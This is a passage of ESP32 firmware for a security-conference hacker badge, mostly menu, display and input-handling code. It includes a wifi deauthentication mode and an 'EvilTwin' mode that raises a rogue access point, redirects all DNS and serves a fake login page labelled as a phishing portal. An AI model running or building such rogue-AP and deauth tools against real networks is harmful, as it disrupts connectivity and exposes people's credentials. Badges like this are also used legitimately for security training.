    int s2=g_log_offset, e2=min((int)g_log_count,s2+6); int y=36;
    for(int i=s2;i<e2;++i){
        tft.drawRoundRect(8,y-2,tft.width()-16,14,3,kPanel);
        tft.setTextColor(kText,kBg); tft.drawString(g_logs[i],12,y,1);
        y+=18;
    }
    if(g_log_count==0){tft.setTextColor(uiYellow,kBg);tft.drawCentreString("Sin logs",tft.width()/2,72,1);}
    tft.setTextColor(kDim,kBg);
    tft.drawCentreString("ARR/ABA SCROLL",tft.width()/2,142,1);
    tft.drawCentreString("SEL LIMPIAR  EXT VOLVER",tft.width()/2,152,1);
}

// ---------------------------------------------------------------------------
// Redraw dispatcher
// ---------------------------------------------------------------------------
void redraw() {
    // Blink-only update (no full redraw)
    if (g_blink_dirty && g_view==VIEW_BOOT) {
        drawBootBlink();
        g_blink_dirty = false;
    }
    if (!g_full_redraw) return;
    switch (g_view) {
        case VIEW_BOOT:
            drawBootStatic();
            drawBootBlink();
            g_blink_dirty = false;
            break;
        case VIEW_MENU:        drawMenu();        break;
        case VIEW_WIFI_SCAN:   drawWifiScan();    break;
        case VIEW_TWIN_DETECT: drawTwinDetect();  break;
        case VIEW_WIFI_DEAUTH: drawWifiDeauth();  break;
        case VIEW_EVILTWIN:    drawEvilTwin();    break;
        case VIEW_HASH_TOOL:   drawHashTool();    break;
        case VIEW_CIPHER_TOOL: drawCipherTool();  break;
        case VIEW_LOGS_TOOL:   drawLogsTool();    break;
    }
    g_full_redraw = false;
}

// ---------------------------------------------------------------------------
// Navigation
// ---------------------------------------------------------------------------
void goMenu()        { g_view=VIEW_MENU; g_menu_sel=0; g_boot_drawn=false; g_full_redraw=true; }
void goWifiScan()    {
    g_view=VIEW_WIFI_SCAN; g_scan_offset=0; g_full_redraw=true;
    tft.fillScreen(kBg); clearPadPixels();
    tft.setTextColor(uiRed,kBg);    tft.drawCentreString("WIFI SCAN",tft.width()/2,50,2);
    tft.setTextColor(uiYellow,kBg); tft.drawCentreString("Escaneando...",tft.width()/2,80,1);
    if(WiFi.getMode()==WIFI_OFF) WiFi.mode(WIFI_STA);
    const int found=WiFi.scanNetworks(false,true);
    g_scan_count=(found<0)?0:found;
    addLog("SCAN:"+String(g_scan_count)+"nets");
}
void goTwinDetect()  {
    g_view=VIEW_TWIN_DETECT; g_twin_offset=0; g_twin_count=0; g_full_redraw=true;
    tft.fillScreen(kBg); clearPadPixels();
    tft.setTextColor(uiRed,kBg);    tft.drawCentreString("TWIN DETECT",tft.width()/2,50,2);
    tft.setTextColor(uiYellow,kBg); tft.drawCentreString("Buscando twins...",tft.width()/2,80,1);
    if(WiFi.getMode()==WIFI_OFF) WiFi.mode(WIFI_STA);
    const int found=WiFi.scanNetworks(false,true);
    g_scan_count=(found<0)?0:found;
}
void goWifiDeauth()  { WifiDeauthTool::init(); g_view=VIEW_WIFI_DEAUTH; g_full_redraw=true; addLog("DEAUTH init"); }
void goEvilTwin()    { eviltwin_active=true; g_view=VIEW_EVILTWIN; g_full_redraw=true; initEvilTwin(); }
void goHashTool()    { g_view=VIEW_HASH_TOOL;   g_hash_source=0;   g_full_redraw=true; addLog("HASH"); }
void goCipherTool()  { g_view=VIEW_CIPHER_TOOL; g_cipher_source=0; g_full_redraw=true; addLog("CIFRADOR"); }
void goLogsTool()    { g_view=VIEW_LOGS_TOOL;   g_log_offset=0;    g_full_redraw=true; }

// ---------------------------------------------------------------------------
// Input handlers
// ---------------------------------------------------------------------------
void handleBootInput() {
    if (pressed(BTN_SELECT)) { addLog("BOOT->MENU"); goMenu(); }
}
void handleMenuInput() {
    if (menuPressed(BTN_EXTRA)) {
        g_view=VIEW_BOOT; g_boot_drawn=false;
        g_blink_state=true; g_blink_dirty=false; g_full_redraw=true; return;
    }
    if (menuPressed(BTN_UP)||menuPressed(BTN_LEFT))   { g_menu_sel=(g_menu_sel+kMenuItems-1)%kMenuItems; g_full_redraw=true; return; }
    if (menuPressed(BTN_DOWN)||menuPressed(BTN_RIGHT)) { g_menu_sel=(g_menu_sel+1)%kMenuItems;           g_full_redraw=true; return; }
    if (menuPressed(BTN_SELECT)) {
        switch(g_menu_sel){
            case 0:goWifiScan();break;  case 1:goTwinDetect();break;
            case 2:goWifiDeauth();break; case 3:goEvilTwin();break;
            case 4:goCipherTool();break; case 5:goHashTool();break;
            case 6:goLogsTool();break;
        }
    }
}
void handleWifiScanInput() {
    if(menuPressed(BTN_EXTRA)){WiFi.scanDelete();g_scan_count=0;goMenu();return;}
    if(menuPressed(BTN_SELECT)){goWifiScan();return;}
    if((menuPressed(BTN_DOWN)||menuPressed(BTN_RIGHT))&&g_scan_count>0&&(int)(g_scan_offset+kScanPageSize)<g_scan_count){g_scan_offset+=kScanPageSize;g_full_redraw=true;}
    if((menuPressed(BTN_UP)||menuPressed(BTN_LEFT))&&g_scan_offset>=kScanPageSize){g_scan_offset-=kScanPageSize;g_full_redraw=true;}
}
void handleTwinDetectInput() {
    if(menuPressed(BTN_EXTRA)){WiFi.scanDelete();g_scan_count=0;g_twin_count=0;goMenu();return;}
    if(menuPressed(BTN_SELECT)){goTwinDetect();return;}
    if((menuPressed(BTN_DOWN)||menuPressed(BTN_RIGHT))&&(int)(g_twin_offset+2)<g_twin_count){g_twin_offset+=2;g_full_redraw=true;}
    if((menuPressed(BTN_UP)||menuPressed(BTN_LEFT))&&g_twin_offset>=2){g_twin_offset-=2;g_full_redraw=true;}
}
void handleWifiDeauthInput() {
    WifiDeauthTool::tick();
    if(menuPressed(BTN_EXTRA)){WifiDeauthTool::enabled=false;goMenu();return;}
    int idx=-1;
    for(int i=0;i<16;++i){
        if(WifiDeauthTool::networks[i].ssid=="") break;
        if(bytesToStr(WifiDeauthTool::selectedNetwork.bssid,6)==bytesToStr(WifiDeauthTool::networks[i].bssid,6)){idx=i;break;}
    }
    if(menuPressed(BTN_UP)||menuPressed(BTN_LEFT)){if(idx>0){WifiDeauthTool::selectedNetwork=WifiDeauthTool::networks[idx-1];g_full_redraw=true;}return;}
    if(menuPressed(BTN_DOWN)||menuPressed(BTN_RIGHT)){if(idx>=0&&idx<15&&WifiDeauthTool::networks[idx+1].ssid.length()){WifiDeauthTool::selectedNetwork=WifiDeauthTool::networks[idx+1];g_full_redraw=true;}return;}
    if(menuPressed(BTN_SELECT)){
        if(idx==-1){for(int i=0;i<16;++i){if(WifiDeauthTool::networks[i].ssid.length()){WifiDeauthTool::selectedNetwork=WifiDeauthTool::networks[i];WifiDeauthTool::enabled=true;g_full_redraw=true;return;}}}
        else{WifiDeauthTool::enabled=!WifiDeauthTool::enabled;g_full_redraw=true;}
    }
}
void handleHashToolInput() {
    if(menuPressed(BTN_EXTRA)){goMenu();return;}
    if(menuPressed(BTN_UP)||menuPressed(BTN_DOWN)||menuPressed(BTN_LEFT)||menuPressed(BTN_RIGHT)||menuPressed(BTN_SELECT)){g_hash_source=(g_hash_source+1)%3;g_full_redraw=true;}
}
void handleCipherToolInput() {
    if(menuPressed(BTN_EXTRA)){goMenu();return;}
    if(menuPressed(BTN_UP)||menuPressed(BTN_DOWN)||menuPressed(BTN_LEFT)||menuPressed(BTN_RIGHT)||menuPressed(BTN_SELECT)){g_cipher_source=(g_cipher_source+1)%3;g_full_redraw=true;}
}
void handleLogsToolInput() {
    if(menuPressed(BTN_EXTRA)){goMenu();return;}
    if(menuPressed(BTN_SELECT)){g_log_count=0;g_log_offset=0;saveLogs();g_full_redraw=true;return;}
    if((menuPressed(BTN_DOWN)||menuPressed(BTN_RIGHT))&&(int)(g_log_offset+6)<g_log_count){++g_log_offset;g_full_redraw=true;}
    if((menuPressed(BTN_UP)||menuPressed(BTN_LEFT))&&g_log_offset>0){--g_log_offset;g_full_redraw=true;}
}

// ---------------------------------------------------------------------------
// Boot blink — only marks the prompt row dirty, never triggers full redraw
// ---------------------------------------------------------------------------
void updateAnimation() {
    if (g_view != VIEW_BOOT) return;
    const uint32_t now = millis();
    if ((now - g_blink_ms) >= 500) {
        g_blink_ms    = now;
        g_blink_state = !g_blink_state;
        g_blink_dirty = true;   // only the 10-px prompt row, NOT g_full_redraw
    }
}

// ---------------------------------------------------------------------------
// Display init  
// ---------------------------------------------------------------------------
void setupDisplay() {
    tft.init();
    tft.setRotation(3);
    tft.fillScreen(kBg);
    initColors();        // must come after tft.init()
    clearPadPixels();    // clear the GREENTAB hardware pad columns once at boot
    WiFi.mode(WIFI_OFF);
}

// ---------------------------------------------------------------------------
// setup / loop
// ---------------------------------------------------------------------------
void setup() {
    Serial.begin(115200);
    delay(80);
    setupHardware();
    setupDisplay();
    g_prefs_ready = g_prefs.begin("redr4ven", false);
    loadLogs();
    Serial.println("REDR4VEN badge v3 — ROOTEDCON 2026");
    addLog("ARRANQUE OK");
    g_view        = VIEW_BOOT;
    g_full_redraw = true;
    g_blink_state = true;
    g_blink_ms    = millis();
}

void loop() {
    updateButtons();
    updateAnimation();
    switch (g_view) {
        case VIEW_BOOT:        handleBootInput();       break;
        case VIEW_MENU:        handleMenuInput();       break;
        case VIEW_WIFI_SCAN:   handleWifiScanInput();   break;
        case VIEW_TWIN_DETECT: handleTwinDetectInput(); break;
        case VIEW_WIFI_DEAUTH: handleWifiDeauthInput(); break;
        case VIEW_EVILTWIN:    handleEvilTwinInput(); loopEvilTwin(); break;
        case VIEW_HASH_TOOL:   handleHashToolInput();   break;
        case VIEW_CIPHER_TOOL: handleCipherToolInput(); break;
        case VIEW_LOGS_TOOL:   handleLogsToolInput();   break;
    }
    redraw();
    delay(8);
}

// ---------------------------------------------------------------------------
// EvilTwin  
// ---------------------------------------------------------------------------
void initEvilTwin() {
    eviltwin_active = true;
    WiFi.mode(WIFI_AP);
    WiFi.softAP("EvilTwin_AP","12345678");
    dnsServer.start(53,"*",WiFi.softAPIP());
    evilServer.on("/",HTTP_GET,[](){
        evilServer.send(200,"text/html",
            "<html><body><h1>Captive Portal</h1>"
            "<form><input placeholder='usuario'>"
            "<input placeholder='clave' type='password'>"
            "<button>Login</button></form></body></html>");
    });
    evilServer.begin();
    addLog("EVILTWIN ON");
}
void loopEvilTwin() {
    dnsServer.processNextRequest();
    evilServer.handleClient();
}
void handleEvilTwinInput() {
    if(menuPressed(BTN_EXTRA)){
        eviltwin_active=false;
        WiFi.softAPdisconnect(true); WiFi.mode(WIFI_OFF);
        dnsServer.stop(); evilServer.stop();
        addLog("EVILTWIN OFF"); goMenu(); return;
    }
    if(menuPressed(BTN_SELECT)) g_full_redraw=true;
}
void drawEvilTwin() {
    tft.fillScreen(kBg); clearPadPixels();
    tft.drawRect(0,0,tft.width(),tft.height(),kLine);
    tft.setTextColor(uiRed,kBg);
    tft.drawCentreString("EVILTWIN",tft.width()/2,6,2);
    tft.setTextColor(kDim,kBg);
    tft.drawCentreString("Portal phishing activo",tft.width()/2,22,1);
    tft.setTextColor(kWhite,kBg);
    tft.drawCentreString("SSID: EvilTwin_AP",tft.width()/2,50,1);
    tft.drawCentreString("Clave: 12345678",tft.width()/2,66,1);
    tft.setTextColor(kDim,kBg);
    tft.drawCentreString("EXT VOLVER",tft.width()/2,152,1);
}